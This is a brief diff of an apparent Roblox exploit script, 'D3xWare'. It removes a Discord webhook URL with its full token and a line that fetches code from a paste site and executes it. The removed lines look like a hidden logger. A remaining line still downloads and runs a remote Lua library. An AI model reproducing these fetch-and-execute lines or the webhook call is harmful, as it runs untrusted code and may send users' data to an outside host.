@@ -1,7 +1,4 @@
 -- // D3xWare V1.0.3D
-getgenv().DiscordWebhook = "https://discord.com/api/webhooks/1062994740645208064/fDLWFzq7xXe-fkV0kb_w8MLz3BNB7GJ1ht-eQItOcyJM8A6MujJPiwqpR0wuzyOYFcOO"
-getgenv().embedcolor = "0x78ff78" 
-loadstring(game:HttpGet("https://pst.klgrth.io/paste/e3d52/raw"))()
 local DiscordLib = loadstring(game:HttpGet"https://raw.githubusercontent.com/Deez-Nuts445/GHSandbox_LUA_1/main/discord-ui.lua")()
 function checkDate(mth,day)
 local month = os.date("*t")["month"]
